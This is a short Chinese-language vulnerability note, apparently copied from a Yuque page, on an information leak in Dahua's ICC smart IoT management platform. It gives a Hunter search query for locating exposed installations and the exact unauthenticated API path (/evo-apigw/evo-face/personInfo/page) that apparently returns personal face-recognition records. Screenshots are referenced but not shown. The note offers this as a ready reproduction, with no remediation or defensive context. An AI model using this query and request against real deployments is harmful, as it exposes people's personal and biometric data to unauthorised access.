# 大华智能物联综合管理平台(ICC)page存在信息泄露

# 一、漏洞简介
浙江大华技术股份有限公司，是全球领先的以视频为核心的智慧物联解决方案提供商和运营服务商，大华智能物联综合管理平台(ICC)page存在信息泄露。

# 二、影响版本
+ 大华智能物联综合管理平台(ICC)

# 三、资产测绘
+ hunter`web.body="*客户端会小于800*"`
+ 特征

![1698336070869-d2bec4ae-041a-43a9-981b-f3b9dad9c004.png](./img/yk3Nv7TC8vo6v7Lu/1698336070869-d2bec4ae-041a-43a9-981b-f3b9dad9c004-151161.png)

# 四、漏洞复现
```plain
/evo-apigw/evo-face/personInfo/page?pageSize=10
```

![1700140396421-a6bee011-dc48-4d41-876b-a7f0f649c78e.png](./img/yk3Nv7TC8vo6v7Lu/1700140396421-a6bee011-dc48-4d41-876b-a7f0f649c78e-456265.png)



> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rnq80hcwo0wrk26s>